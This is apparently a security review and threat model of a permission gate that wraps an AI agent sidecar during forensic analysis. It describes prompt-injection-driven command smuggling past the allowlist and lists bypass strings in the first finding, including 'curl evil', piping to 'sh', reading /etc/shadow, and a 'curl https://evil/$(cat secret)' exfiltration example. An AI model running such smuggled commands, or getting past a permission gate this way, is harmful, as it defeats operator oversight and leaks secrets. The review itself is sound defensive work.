# Threat Model - OpenClaudeTool permission gate (Task 04.0) - 2026-07-09

## Assets & trust boundaries

- **Asset:** read-only forensic guarantee over the repository/host under analysis;
  incident payloads and secrets that OpenClaude tool calls may touch.
- **Boundary crossed:** untrusted incident payload (prompt-injectable) →
  OpenClaude sidecar agentic loop → `PERMISSION_REQ` frame `msg.content`
  (attacker-influenceable command string) → `OpenClaudeTool._check_permission`
  (security decision) → EventBus / stream continuation.
- **Key architectural fact:** the tool-side gate has **no approval back-channel**.
  `OpenClaudeGrpcClient.query` is a pure server-streaming RPC; an "auto-approval"
  is merely *continuing to iterate*, a deny is *raising and abandoning the stream*.
  The **primary** read-only control is the sidecar's launch-flag allowlist
  (`--allowed-tools` / bash allowlist, set by managed mode `_build_argv`, Task
  03.0/02). The tool-side gate is therefore a **defense-in-depth + observability**
  control, not the enforcement point.

## Findings

### [MEDIUM] Tool-side permission gate is trivially bypassable via shell metacharacters
- Vector / evidence: `src/aegis_swr/openclaude/tool.py:337-351` (`_binary_of`) and
  `:438-453` (`_is_allowlisted`). The decision uses
  `os.path.basename(command.split()[0])` and exact-matches the allowlist.
  Empirically confirmed **APPROVED** (allowlisted first token, non-allowlisted
  binary smuggled): `"rg ; curl evil"`, `"rg && wget x"`, `"rg | sh"`,
  `"rg $(curl x)"`, backticks, embedded newline, `"cat /etc/shadow > /tmp/x; sh"`,
  and path confusion `"../../bin/rg"`. Only metacharacters *glued* to the first
  token (`"rg;..."`, `"rg>out;..."`) are accidentally denied — an attacker simply
  inserts a space. CWE-88 (argument/command injection), CWE-807 (reliance on
  untrusted input for a security decision), CWE-20 (improper input validation).
- Impact: in **managed mode** the sidecar's own launch-flag allowlist still blocks
  the smuggled binary at exec time, so impact is limited to lost audit signal (no
  `OpenClaudePermissionDenied` emitted) and no early abort — defense-in-depth
  degraded, read-only intact. In **external mode** Aegis sets no launch flags; if
  the operator's sidecar is not independently allowlisted, this bypassable gate is
  the only Aegis-side control and it fails open, enabling prompt-injection-driven
  writes / secret exfil (`curl https://evil/$(cat secret)`). The gate never gates
  execution anyway (no back-channel), so it cannot be the read-only guarantee.
- Mitigation: before the allowlist check, reject any command whose string contains
  shell metacharacters `; & | $ \` \n \r ( ) { } < > \` outright (deny, emit,
  raise) so the gate's semantics match per-binary exec. Additionally reject
  leading-path binaries (a token containing `/`) or require the resolved basename
  to equal the token. Hand to `python-expert`; regression cases to
  `testing-expert` (every row of the bypass matrix above).

### [MEDIUM] Docstrings/contract overstate the read-only guarantee delivered by this layer
- Vector / evidence: `tool.py:296-304` and subtask doc
  `04.0-openclaude-tool/03-permission-allowlist.md:18-20` claim the allowlist
  "guarantees OpenClaude cannot mutate the repository." Given the metacharacter
  bypass and the absence of an approval back-channel, the tool layer delivers no
  such guarantee; the guarantee lives in the sidecar launch flags (managed mode
  only). CWE-1059 (incomplete/incorrect security documentation).
- Impact: a reviewer/operator may rely on the stated guarantee and deploy external
  mode without independently allowlisting the sidecar, believing Aegis enforces
  read-only. This is the misconfiguration that upgrades the MEDIUM above toward
  arbitrary execution.
- Mitigation: reword the docstrings/contract to state the tool gate is
  defense-in-depth/observability and that the sidecar launch-flag allowlist is the
  authoritative control; add an external-mode runbook requirement that the
  operator launch the sidecar with the bash allowlist. Hand to `docs-updater`.

### [LOW] `_arg_count` / chunk accumulation DoS surface on hostile frames
- Vector / evidence: `tool.py:278-294` (`json.loads` of untrusted `msg.content`)
  and `:166-173,228` (unbounded `chunks` accumulation, truncated only at `DONE`).
  Deeply nested JSON raises `RecursionError`; a compromised/hostile sidecar can
  stream unbounded `TEXT_CHUNK` frames before truncation.
- Impact: contained — `RecursionError`/any exception is a subclass of `Exception`
  and is caught by the `delegate` final arm, returning a typed `internal_error`;
  no crash, no payload logged. Memory growth is bounded per-frame by the gRPC
  max-message size but not aggregated pre-truncation.
- Mitigation (optional): cap accumulated content length incrementally and cap
  `_arg_count` input length before `json.loads`. Non-blocking.

## Confirmations (requested items)

- **C9 payload safety — PASS.** Events carry ids/counts/status/binary-name only:
  `OpenClaudeToolCall.arg_count` (count), `OpenClaudeToolResult.result_size`
  (`len`), `OpenClaudePermissionDenied.denied_binary` (basename, not full command),
  `OpenClaudeStreamError.code` (status). No `msg.content`, accumulated text, or
  command string is logged or placed on any event/exception. `_arg_count` parses
  but never logs/emits the parsed content.
- **Budget integrity (C5/C7) — PASS.** `charge` is called only in `_on_done`
  (success). Deny (`_check_permission` raise → `_failure`), `ERROR` frame
  (`_on_error_frame`), gRPC failure, and the final `except Exception` all route
  through `_failure`, which mutates no budget. Pre-check `can_afford` reserves
  nothing. A denied permission cannot corrupt accounting.
- **X002 exemption — LEGITIMATE.** `delegate`'s `except Exception` (tool.py:147)
  re-raises nothing and returns a typed `_failure("internal_error", ...)`; it is a
  genuine must-never-raise resilience boundary (C9), justifying the
  `[tool.flake8_lint_tests].exclude` entry.
- **C3 — PASS.** `tool.py` imports no `grpc`/`_pb2` directly; it uses the typed
  `aegis_swr.openclaude.grpc.client` projection (`AgentFrame`, `FrameKind`,
  `OpenClaudeGrpcClient`). `code_intel/` imports neither `aegis_swr.openclaude`
  nor `grpc`.

## Verdict: PASS_WITH_FOLLOWUP (ADVISORY - no CRITICAL; does not block merge)

No CRITICAL finding: the bypassable string parse is a defense-in-depth /
observability control, not the enforcement point (no approval back-channel;
sidecar launch-flag allowlist is authoritative and unaffected in managed mode).
Merge is not blocked. The two MEDIUM findings are required follow-ups before the
external-mode path (Task 03.0/01) and app wiring (06.0) ship; if this gate is ever
promoted to the sole/authoritative control, the bypass becomes CRITICAL.
